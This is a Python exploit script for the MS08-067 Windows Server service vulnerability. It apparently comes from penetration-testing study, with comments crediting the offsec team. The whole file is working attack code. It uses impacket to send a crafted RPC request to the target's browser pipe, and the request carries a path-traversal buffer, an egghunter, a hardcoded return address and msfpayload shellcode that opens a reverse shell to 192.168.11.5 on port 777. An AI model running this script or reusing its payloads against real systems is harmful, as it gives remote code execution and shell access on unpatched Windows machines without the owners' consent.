#!/usr/bin/python
 
from impacket import smb
from impacket import uuid
from impacket.dcerpc import dcerpc
from impacket.dcerpc import transport
import sys
 
####################################
# MS08_067 case of study by ly0n
# Greetz: muts,ryujin & offsec team
####################################
 
try:
    target = sys.argv[1]
    port = 445
except IndexError:
    print "Usage: program host"
    sys.exit()
 
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()
dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188','3.0')))
# revere shell 192.168.11.5 port 777 by msfpayload
payload = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b"
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff"
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d"
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44"
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f"
"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29"
"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50"
"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x68"
"\xc0\xa8\x0b\x05\x68\x02\x00\x03\x09\x89\xe6\x6a\x10\x56"
"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"
"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"
"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"
"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"
"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"
"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
"\x6f\x6a\x00\x53\xff\xd5")
# MS08_067 simple egghunter exploit for the glory of satan
stub='\x01\x00\x00\x00' # Reference ID
stub+='\xac\x00\x00\x00' #  MAX COUNT
stub+='\x00\x00\x00\x00' # offset
stub+='\xac\x00\x00\x00' #  ACTUAL COUNT
stub+="T00WT00W"+ "\x90" * 18 + payload
stub+='\x00\x00\x00\x00' # UNC Trailer padding
stub+='\x2f\x00\x00\x00' # Max c ount
stub+='\x00\x00\x00\x00' # offset
stub+='\x2f\x00\x00\x00' # Actual count
 
stub+= '\x41\x00\x5c\x00\x2e\x00\x2e\x00' # evil path
stub+= '\x5c\x00\x2e\x00\x2e\x00\x5c\x00' # evil path
 
# egg = w00t
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD" # egghunter
"\x2E\x3C\x05\x5A\x74\xEF\xB8\x54\x30\x30\x57"
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")
 
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac"
jump = "\xEB\xD0\x90\x90" # short jump back + nops
ret= "\x3A\x58\xA3\x7C" # return addr jmp edx in user32.dll
stub+= "\x41" * 18 + ret  + "\x90" * 12 + egghunter + "\x90" * 4 + jump # evil buffer
 
 
stub+= '\x00\x00'
stub+='\x00\x00\x00\x00' # max buf
stub+='\x02\x00\x00\x00' # max count
stub+='\x02\x00\x00\x00' # offset
stub+='\x00\x00\x00\x00' # actual count
stub+='\x02\x00\x00\x00' # prefix
stub+='\x5c\x00\x00\x00' # pointer to pathtype
stub+='\x01\x00\x00\x00' # path type and flags
stub+='\x01\x00\x00\x00'
 
dce.call(0x1f, stub)